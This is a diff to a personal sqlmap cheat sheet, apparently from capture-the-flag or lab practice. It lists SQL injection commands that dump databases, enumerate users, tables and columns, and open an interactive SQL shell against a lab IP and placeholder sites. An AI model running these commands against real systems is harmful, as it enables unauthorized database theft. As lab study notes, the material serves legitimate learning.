@@ -1,13 +1,19 @@
+--dump is used to extract every information.
+
 Enumerating database
 ---------------------
-sqlmap -u "http://10.10.231.6/register/user-check?username=admin" -dump
-
-Dump all the available databases and tables
--------------------------------------------
-sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all
+sqlmap -u "http://10.10.231.6/register/user-check?username=admin" --dump
+sqlmap -u "http://10.10.231.6/register/user-check?username=admin" --dbs
+sqlmap -r req.txt --current-db (current database)
+_____________________________________________________________________________________________________________________________________________________________________________________
+Enumerating users
+------------------
+sqlmap -r req.txt --current-user (current user)
+_____________________________________________________________________________________________________________________________________________________________________________________
 
 Enumerating all tables
---------------------------
+-----------------------
+
 GET method ( doen't need request file or --method )
 ----------
 sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
@@ -15,18 +21,32 @@ sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
 POST method (need request file or --method POST)
 ----------
 sqlmap -r req.txt -D <database_name> --tables
+___________________________________________________________________________________________________________________________________________________________________________________
 
 Enumerating columns 
--------------------
+--------------------
+
 sqlmap -r req.txt -D <database_name> -T <table_name> --columns
+_____________________________________________________________________________________________________________________________________________________________________________________
 
 sqlmap -u "http://example.com/login" --data "username=test&password=test" --method POST -p username --sql-shell
 
-sqlmap -u "http://example.com/login" --data "username=test&password=test" --method POST -p username --dbms
+sqlmap -u "http://example.com/login" --data "username=test&password=test" --method POST -p username --dbs
 
+--dbs used to enumerate databases and --dbms is used to specify the database.
 --sql-shell = gives you interactive sql shell to code sql queries manually
 --data = add data in post method
 -p username = using username parameter
+_____________________________________________________________________________________________________________________________________________________________________________________
+
+Difference between
+-------------------
+#sqlmap -r req.txt -D blood -T flag --dump (more accurate)
+#sqlmap -r req.txt -D blood -T flag -C name --dump
+_____________________________________________________________________________________________________________________________________________________________________________________
+
+
+
 
 
 
